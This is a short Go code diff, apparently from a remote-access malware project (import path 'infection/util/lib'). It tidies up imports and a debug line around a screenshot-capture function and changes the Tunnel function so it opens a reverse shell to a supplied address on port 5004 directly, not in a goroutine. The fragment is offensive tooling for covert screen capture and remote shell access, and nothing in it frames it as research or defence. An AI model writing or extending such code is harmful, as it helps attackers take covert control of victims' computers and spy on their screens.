@@ -11,11 +11,7 @@ import (
 	"infection/util/lib"
 	"os"
 	"runtime"
-
-	//"time"
-	//"strings"
 	"unsafe"
-	//"fmt"
 )
 
 const (
@@ -80,9 +76,8 @@ func getscreenshot() []string {
 
 		defer file.Close()
 		png.Encode(file, img)
-
-		//fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
 	}
+
 	return filenames
 }
 func Tunnel(addr string) {
@@ -102,7 +97,7 @@ func Tunnel(addr string) {
 					<-finflag
 					go lib.Removetempimages(filenames, finflag)
 				}
-				go reverse.CreateRevShell("tcp", addr+":5004")
+				reverse.CreateRevShell("tcp", addr+":5004")
 			} else {
 				return
 			}
